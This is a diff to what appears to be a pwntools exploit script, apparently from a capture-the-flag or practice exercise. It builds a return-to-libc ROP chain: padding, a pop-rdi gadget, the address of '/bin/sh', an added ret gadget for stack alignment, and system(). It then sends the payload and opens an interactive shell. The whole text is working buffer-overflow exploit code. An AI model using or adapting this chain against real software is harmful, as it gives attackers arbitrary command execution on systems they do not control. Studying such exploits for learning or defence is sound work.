@@ -50,9 +50,12 @@ system_address = libc_base_address + 0x00049850
 # 188962 /bin/sh
 bin_address = libc_base_address + 0x188962
 
+ret_addr = 0x000000000040101a
+
 # ui.pause()
 
-#[0x24 padding] + [0x0000000000401273] + [0x7ffff7f70962] + [0x7ffff7e31850]
-buff = b'A'*18 + p64(pop_rdi_gadget) + p64(bin_address) + p64(system_address)
+#[0x24 padding] + [0x0000000000401273] + [0x7ffff7f70962] + [0x7ffff7e31850] 
+buff = b'A'*18 + p64(pop_rdi_gadget) + p64(bin_address)  + p64(ret_addr) + p64(system_address) # + b'\x90' 
+
 io.sendline(buff)
 io.interactive()
